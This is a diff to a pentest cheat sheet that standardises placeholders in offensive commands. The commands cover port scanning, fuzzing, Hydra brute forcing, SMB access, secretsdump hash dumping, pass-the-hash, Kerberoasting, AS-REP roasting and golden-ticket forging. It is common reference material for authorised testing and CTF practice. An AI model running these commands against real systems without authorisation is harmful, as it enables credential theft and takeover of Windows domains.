@@ -11,11 +11,11 @@
 
 #### Enumerate vhost w/ gobuster & wfuzz
 ```
-Command : gobuster vhost -u <URL to fuzz> -w <wordlist>
+Command : gobuster vhost -u <url> -w <wordlist>
 
   OR
 
-Command : wfuzz -u <URL> -w <wordlist> -H "Host: FUZZ.example.com" --hc <status codes to hide>
+Command : wfuzz -u <url> -w <wordlist> -H "Host: FUZZ.<domain>" --hc <avoid status code>
 ```
 #### Enumerate dirs and files w/ gobuster & wfuzz
 ```
@@ -23,30 +23,30 @@ Command : gobuster -t <threads> dir -u <URL to fuzz> -w <wordlist> -x "{extensio
 
   OR
 
-Command : wfuzz -u example.com/FUZZ.php -w <wordlist>
+Command : wfuzz -u example.com/FUZZ.<extension> -w <wordlist>
 ```
 #### Enumerate parameters
 ```
-Command : wfuzz -u {url}/?FUZZ=ls+-la -w <wordlist> --hw 2
+Command : wfuzz -u <url>/?FUZZ=ls+-la -w <wordlist> --hw 2
 ```
 # Linux
 
 ## Discovery & Scanning
 #### Scan tcp ports w/ nmap & nc
 ```
-Command : sudo nmap -sS -sV -T5 -v {domain/ip} -oG all_tcp.nmap
+Command : sudo nmap -sS -sV -T5 -v <ip/domain> -oG all_tcp.nmap
 
   OR
 
-Command : nc -zv {domain/ip} 1-65535
+Command : nc -zv <ip/domain> 1-65535
 ```
 #### Scan udp ports w/ nmap & nc
 ```
-Command : sudo nmap -sU -sV -T5 -v {domain/ip} -oG all_udp.nmap
+Command : sudo nmap -sU -sV -T5 -v <ip/domain> -oG all_udp.nmap
 
   OR
 
-Command : nc -zuv {domain/ip} 1-65535
+Command : nc -zuv <ip/domain> 1-65535
 ```
 #### identify if you are in a container
 ```
@@ -67,7 +67,7 @@ Command : find / -perm -4000 2>/dev/null
 ## Exploitation
 #### Brute force services w/ hydra
 ```
-Command : hydra -l {user} -P {wordlist - password} {domain/ip} {service}
+Command : hydra -l <user> -P <wordlist> <ip/domain> <service>
 ```
 
 ## General
@@ -99,7 +99,7 @@ Command : stty rows 22 columns 140
 #### RDP
 
 ```
-Command: xfreerdp /u:"USER" /p:"PASSWORD" /d:"DOMAIN" /v:"IP" /dynamic-resolution /drive:shared,"FOLDER"
+Command: xfreerdp /u:"<user>" /p:"<password>" /d:"<domain>" /v:"<ip>" /dynamic-resolution /drive:"shared,<folder>"
 ```
 
 # Windows
@@ -190,11 +190,11 @@ Command: powershell -ep bypass
 
 Command: . .\SharpHound.ps1
 
-Command: Invoke-Bloodhound -CollectionMethod All -Domain {Domain} -ZipFileName loot.zip
+Command: Invoke-Bloodhound -CollectionMethod All -Domain <domain> -ZipFileName loot.zip
 
   OR
 
-Command: SharpHound.exe -c all -d {Domain} --zipfilename loop.zip
+Command: SharpHound.exe -c all -d <domain> --zipfilename loop.zip
 
 ```
 ## RPC
@@ -204,13 +204,13 @@ Command: SharpHound.exe -c all -d {Domain} --zipfilename loop.zip
 Enumerate rpc
 
 ```
-Command: impacket-rpcdump {IP/DOMAIN}
+Command: impacket-rpcdump <domain/ip>
 ```
 
 Check if is vulnerable to printnightmare
 
 ```
-Command: impacket-rpcdump {IP/DOMAIN} | egrep 'MS-RPRN|MS-PAR'
+Command: impacket-rpcdump <domain/ip> | egrep 'MS-RPRN|MS-PAR'
 ```
 
 ## SMB
@@ -224,24 +224,24 @@ Command: impacket-rpcdump {IP/DOMAIN} | egrep 'MS-RPRN|MS-PAR'
 *Enumerate shares*
 
 ```
-Command : smbclient -U {USER} -L \\\\{IP/DOMAIN}\\
+Command : smbclient -U <user> -L \\\\<ip/domain>\\
 ```
 
 *Access to share*
 
 ```
-Command : smbclient -U {USER} \\\\{IP/DOMAIN}\\{SHARE}
+Command : smbclient -U <user> \\\\<ip/domain>\\<share>
 ```
 
 #### Dump AD password hashes
 
 ```
-Command : python3 secretsdump.py -just-dc-ntlm {DOMAIN}/{USER}@{IP}
+Command : python3 secretsdump.py -just-dc-ntlm <domain>/<user>@<ip/domain>
 ```
 
 #### Pass the hash
 ```
-Command: evil-winrm -i {IP} -u {USER} -H {HASH}
+Command: evil-winrm -i <ip> -u <user> -H <ntlm hash>
 ```
 
 ## Kerberos
@@ -274,7 +274,7 @@ By brute-forcing Kerberos pre-authentication, you do not trigger the account fai
 
 This will brute force user accounts from a domain controller using a supplied wordlist.
 ```
-Command : ./kerbrute userenum --dc {domain_controler_KDC} -d {domain} {wordlist}
+Command : ./kerbrute userenum --dc <domain kdc> -d <domain> <wordlist>
 ```
 ### Harvesting & Brute-Forcing Tickets
 
@@ -292,7 +292,7 @@ This attack will take a given Kerberos-based password and spray it against all f
 
 This command will take a given password and "spray" it against all found users then give the .kirbi TGT for that user.
 ```
-Command : .\Rubeus.exe brute /password:{password} /noticket
+Command : .\Rubeus.exe brute /password:<password> /noticket
 ```
 ### Kerberoasting
 
@@ -308,13 +308,13 @@ Command : .\Rubeus.exe kerberoast
 
 This will dump the Kerberos hash for all kerberoastable accounts it can find on the target domains; however, this does not have to be on the targets machine and can be done remotely.
 ```
-Command : sudo python3 GetUserSPNs.py {domain}/{user}:{password} -dc-ip {domain_controller_ip} -request
+Command : sudo python3 GetUserSPNs.py <domain>/<user>:<password> -dc-ip <ip/domain> -request
 ```
 #### Crack those Hashes w/ hashcat
 ```
-Command : hashcat -m 13100 -a 0 {hash} {wordlists}
+Command : hashcat -m 13100 -a 0 <hash> <wordlist>
 
-Command : john --wordlist={password} {hash}
+Command : john --wordlist=<wordlist> <hash>
 ```
 ### AS-REP Roasting
 
@@ -329,16 +329,16 @@ Command : .\Rubeus.exe asreproast
 
 #### Dumping KRBASREP5 Hashes w/ Impacket GetNPUsers.py
 ```
-Command : python3 GetNPUsers.py {Domain}/ -usersfile {UserList} -no-pass -dc-ip {IP}
+Command : python3 GetNPUsers.py <domain>/ -usersfile <wordlist> -no-pass -dc-ip <ip/domain>
 ```
 
 #### Crack those Hashes w/ hashcat
 
 crack those hashes! Rubeus AS-REP Roasting uses hashcat mode 18200 or John the ripper.
 ```
-Command : hashcat -m 18200 {hash} {wordlist}
+Command : hashcat -m 18200 <hash> <wordlist>
 
-Command : john --format:krb5asrep {hash} --wordlist={wordlists}
+Command : john --format:krb5asrep <hash> --wordlist=<wordlist>
 ```
 ### Pass the Ticket
 
@@ -382,7 +382,7 @@ Sub_Command : lsadump::lsa /inject /name:krbtgt
 
 This is the command for creating a golden ticket to create a silver ticket simply put a service NTLM hash into the krbtgt slot, the sid of the service account into sid, and change the id to 1103.
 ```
-Command : Kerberos::golden /user:Administrator /domain:controller.local /sid:{sid} /krbtgt:{krbtgt} /id:{id}
+Command : Kerberos::golden /user:<user> /domain:controller.local /sid:<sid> /krbtgt:<krbtgt> /id:<id>
 ```
 #### Use the Golden/Silver Ticket to access other machines
 ```
